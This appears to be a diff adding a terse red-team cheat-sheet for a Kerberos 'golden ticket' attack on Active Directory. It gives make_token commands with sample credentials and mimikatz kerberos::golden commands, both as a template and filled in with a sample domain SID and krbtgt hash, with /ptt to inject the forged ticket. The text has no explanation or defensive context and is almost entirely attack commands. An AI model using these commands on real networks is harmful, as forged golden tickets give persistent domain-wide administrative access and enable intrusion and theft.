@@ -1,0 +1,14 @@
+GOLDEN TICKET
+Make a sacrificial token
+
+make_token domain\okiedoke PASSw0rd123 
+
+Make Golden Ticket
+
+mimikatz kerberos::golden /user:<username> /domain:<FQDN> /sid:<sid of parent or child domain> /krbtgt:<hash of krbtgt> /ptt 
+
+make_token domain\localadmin PASSw0rd123
+
+
+mimikatz kerberos::golden /user:da /domain:domain.local /sid:S-1-5-21-3884802495-1826026284-4176013182 /krbtgt:e16dde5d62196257d6b1e847d746ac69 /ptt 
+
